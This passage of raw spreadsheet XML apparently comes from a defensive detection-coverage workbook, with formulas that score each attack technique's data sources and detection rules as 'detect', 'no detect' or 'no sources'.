      <c r="H245" s="9" cm="1">
        <f t="array" ref="H245">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I245" s="9" t="str" cm="1">
        <f t="array" ref="I245">IF(SUM(IF($C245=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C245=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J245" s="9" t="str" cm="1">
        <f t="array" ref="J24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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M245" s="9" cm="1">
        <f t="array" ref="M245">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N245" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O245" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P245" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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45" t="s">
        <v>368</v>
      </c>
      <c r="U245" t="s">
        <v>1330</v>
      </c>
      <c r="V245" t="s">
        <v>1331</v>
      </c>
      <c r="W245" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="246" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A246" t="s">
        <v>1332</v>
      </c>
      <c r="B246" t="s">
        <v>1332</v>
      </c>
      <c r="C246" t="s">
        <v>151</v>
      </c>
      <c r="D246" t="s">
        <v>3</v>
      </c>
      <c r="E246" t="s">
        <v>1333</v>
      </c>
      <c r="F246" s="9">
        <f t="shared" si="3"/>
        <v>11</v>
      </c>
      <c r="G246" s="9" cm="1">
        <f t="array" ref="G246">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H246" s="9" cm="1">
        <f t="array" ref="H246">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I246" s="9" t="str" cm="1">
        <f t="array" ref="I246">IF(SUM(IF($C246=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C246=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J246" s="9" cm="1">
        <f t="array" ref="J24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246" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M246" s="9" cm="1">
        <f t="array" ref="M246">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N246" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O246" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P246" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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46" t="s">
        <v>1334</v>
      </c>
      <c r="U246" t="s">
        <v>1335</v>
      </c>
      <c r="V246" t="s">
        <v>1336</v>
      </c>
      <c r="W246" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="247" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A247" t="s">
        <v>1332</v>
      </c>
      <c r="B247" t="s">
        <v>1337</v>
      </c>
      <c r="C247" t="s">
        <v>303</v>
      </c>
      <c r="D247" t="s">
        <v>3</v>
      </c>
      <c r="E247" t="s">
        <v>1338</v>
      </c>
      <c r="F247" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G247" s="9" cm="1">
        <f t="array" ref="G247">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H247" s="9" t="str" cm="1">
        <f t="array" ref="H247">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I247" s="9" t="str" cm="1">
        <f t="array" ref="I247">IF(SUM(IF($C247=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C247=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J247" s="9" t="str" cm="1">
        <f t="array" ref="J24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47" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M247" s="9" cm="1">
        <f t="array" ref="M247">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N247" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O247" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P247" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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47" t="s">
        <v>368</v>
      </c>
      <c r="U247" t="s">
        <v>1339</v>
      </c>
      <c r="V247" t="s">
        <v>1340</v>
      </c>
      <c r="W247" t="b">
        <v>1</v>
      </c>
      <c r="X247" t="s">
        <v>1332</v>
      </c>
    </row>
    <row r="248" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A248" t="s">
        <v>1332</v>
      </c>
      <c r="B248" t="s">
        <v>1341</v>
      </c>
      <c r="C248" t="s">
        <v>298</v>
      </c>
      <c r="D248" t="s">
        <v>3</v>
      </c>
      <c r="E248" t="s">
        <v>1342</v>
      </c>
      <c r="F248" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G248" s="9" cm="1">
        <f t="array" ref="G248">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H248" s="9" t="str" cm="1">
        <f t="array" ref="H248">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I248" s="9" t="str" cm="1">
        <f t="array" ref="I248">IF(SUM(IF($C248=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C248=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J248" s="9" t="str" cm="1">
        <f t="array" ref="J24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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M248" s="9" cm="1">
        <f t="array" ref="M248">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N248" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O248" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P248" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S24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48" t="s">
        <v>368</v>
      </c>
      <c r="U248" t="s">
        <v>1343</v>
      </c>
      <c r="V248" t="s">
        <v>1344</v>
      </c>
      <c r="W248" t="b">
        <v>1</v>
      </c>
      <c r="X248" t="s">
        <v>1332</v>
      </c>
    </row>
    <row r="249" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A249" t="s">
        <v>1332</v>
      </c>
      <c r="B249" t="s">
        <v>1345</v>
      </c>
      <c r="C249" t="s">
        <v>1346</v>
      </c>
      <c r="D249" t="s">
        <v>3</v>
      </c>
      <c r="E249" t="s">
        <v>1347</v>
      </c>
      <c r="F249" s="9">
        <f t="shared" si="3"/>
        <v>7</v>
      </c>
      <c r="G249" s="9" cm="1">
        <f t="array" ref="G249">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H249" s="9" t="str" cm="1">
        <f t="array" ref="H249">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I249" s="9" t="str" cm="1">
        <f t="array" ref="I249">IF(SUM(IF($C249=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C249=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J249" s="9" t="str" cm="1">
        <f t="array" ref="J24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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M249" s="9" cm="1">
        <f t="array" ref="M249">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N249" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O249" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P249" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S24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49" t="s">
        <v>1348</v>
      </c>
      <c r="U249" t="s">
        <v>1349</v>
      </c>
      <c r="V249" t="s">
        <v>1350</v>
      </c>
      <c r="W249" t="b">
        <v>1</v>
      </c>
      <c r="X249" t="s">
        <v>1332</v>
      </c>
    </row>
    <row r="250" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A250" t="s">
        <v>1351</v>
      </c>
      <c r="B250" t="s">
        <v>1351</v>
      </c>
      <c r="C250" t="s">
        <v>179</v>
      </c>
      <c r="D250" t="s">
        <v>1352</v>
      </c>
      <c r="E250" t="s">
        <v>1353</v>
      </c>
      <c r="F250" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G250" s="9" cm="1">
        <f t="array" ref="G250">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H250" s="9" cm="1">
        <f t="array" ref="H250">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I250" s="9" t="str" cm="1">
        <f t="array" ref="I250">IF(SUM(IF($C250=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C250=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J250" s="9" cm="1">
        <f t="array" ref="J25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250" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M250" s="9" cm="1">
        <f t="array" ref="M250">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N250" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O250" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P250" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S25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50" t="s">
        <v>425</v>
      </c>
      <c r="U250" t="s">
        <v>1354</v>
      </c>
      <c r="V250" t="s">
        <v>1355</v>
      </c>
      <c r="W250" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="251" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A251" t="s">
        <v>1351</v>
      </c>
      <c r="B251" t="s">
        <v>1356</v>
      </c>
      <c r="C251" t="s">
        <v>1357</v>
      </c>
      <c r="D251" t="s">
        <v>1352</v>
      </c>
      <c r="E251" t="s">
        <v>438</v>
      </c>
      <c r="F251" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G251" s="9" cm="1">
        <f t="array" ref="G251">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H251" s="9" t="str" cm="1">
        <f t="array" ref="H251">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I251" s="9" t="str" cm="1">
        <f t="array" ref="I251">IF(SUM(IF($C251=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C251=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J251" s="9" t="str" cm="1">
        <f t="array" ref="J25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51" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M251" s="9" cm="1">
        <f t="array" ref="M251">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N251" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O251" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P251" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="Q251" s="15"/>
      <c r="S25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51" t="s">
        <v>425</v>
      </c>
      <c r="U251" t="s">
        <v>1358</v>
      </c>
      <c r="V251" t="s">
        <v>1359</v>
      </c>
      <c r="W251" t="b">
        <v>1</v>
      </c>
      <c r="X251" t="s">
        <v>1351</v>
      </c>
    </row>
    <row r="252" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A252" t="s">
        <v>1351</v>
      </c>
      <c r="B252" t="s">
        <v>1360</v>
      </c>
      <c r="C252" t="s">
        <v>1361</v>
      </c>
      <c r="D252" t="s">
        <v>1352</v>
      </c>
      <c r="E252" t="s">
        <v>1362</v>
      </c>
      <c r="F252" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G252" s="9" cm="1">
        <f t="array" ref="G252">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H252" s="9" t="str" cm="1">
        <f t="array" ref="H252">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I252" s="9" t="str" cm="1">
        <f t="array" ref="I252">IF(SUM(IF($C252=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C252=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J252" s="9" t="str" cm="1">
        <f t="array" ref="J25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52" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M252" s="9" cm="1">
        <f t="array" ref="M252">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N252" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O252" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P252" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S25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52" t="s">
        <v>368</v>
      </c>
      <c r="U252" t="s">
        <v>1363</v>
      </c>
      <c r="V252" t="s">
        <v>1364</v>
      </c>
      <c r="W252" t="b">
        <v>1</v>
      </c>
      <c r="X252" t="s">
        <v>1351</v>
      </c>
    </row>
    <row r="253" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A253" t="s">
        <v>1365</v>
      </c>
      <c r="B253" t="s">
        <v>1365</v>
      </c>
      <c r="C253" t="s">
        <v>205</v>
      </c>
      <c r="D253" t="s">
        <v>6</v>
      </c>
      <c r="E253" t="s">
        <v>1366</v>
      </c>
      <c r="F253" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G253" s="9" cm="1">
        <f t="array" ref="G253">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H253" s="9" cm="1">
        <f t="array" ref="H253">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I253" s="9" t="str" cm="1">
        <f t="array" ref="I253">IF(SUM(IF($C253=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C253=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J253" s="9" t="str" cm="1">
        <f t="array" ref="J25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53" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M253" s="9" cm="1">
        <f t="array" ref="M253">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N253" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O253" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P253" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S25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53" t="s">
        <v>386</v>
      </c>
      <c r="U253" t="s">
        <v>1367</v>
      </c>
      <c r="V253" t="s">
        <v>1368</v>
      </c>
      <c r="W253" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="254" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A254" t="s">
        <v>1369</v>
      </c>
      <c r="B254" t="s">
        <v>1369</v>
      </c>
      <c r="C254" t="s">
        <v>22</v>
      </c>
      <c r="D254" t="s">
        <v>9</v>
      </c>
      <c r="E254" t="s">
        <v>1291</v>
      </c>
      <c r="F254" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G254" s="9" cm="1">
        <f t="array" ref="G254">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H254" s="9" cm="1">
        <f t="array" ref="H254">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I254" s="9" t="str" cm="1">
        <f t="array" ref="I254">IF(SUM(IF($C254=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C254=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J254" s="9" t="str" cm="1">
        <f t="array" ref="J25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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M254" s="9" cm="1">
        <f t="array" ref="M254">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N254" s="9">
